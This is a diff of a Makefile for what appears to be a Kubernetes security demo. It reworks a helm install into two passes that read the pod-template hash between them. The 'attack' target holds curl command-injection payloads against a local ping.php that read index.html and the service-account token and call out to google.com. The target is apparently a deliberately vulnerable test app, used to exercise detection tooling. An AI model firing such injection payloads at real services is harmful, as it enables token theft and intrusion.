@@ -63,8 +63,11 @@ helm-install-no-bob:
 helm-install:
 	@echo "Installing webapp with BoB configuration ..."
 	helm pull oci://ghcr.io/k8sstormcenter/mywebapp 
-	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=true
+	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=false --set bob.ignore=true
 	rm -rf mywebapp-0.1.0.tgz
+	HASH=$$(kubectl get rs -n webapp -o jsonpath='{.items[0].metadata.labels.pod-template-hash}')
+	@echo "The template has is ${HASH}"
+	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0  --namespace webapp --set bob.create=true --set bob.ignore=false --set bob.templateHash=$$(kubectl get rs -n webapp -o jsonpath='{.items[0].metadata.labels.pod-template-hash}')
 	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp
 
 
@@ -92,6 +95,7 @@ attack:
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
 	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20google.com"
+	sleep 30
 
 .PHONY: kubescape
 kubescape:
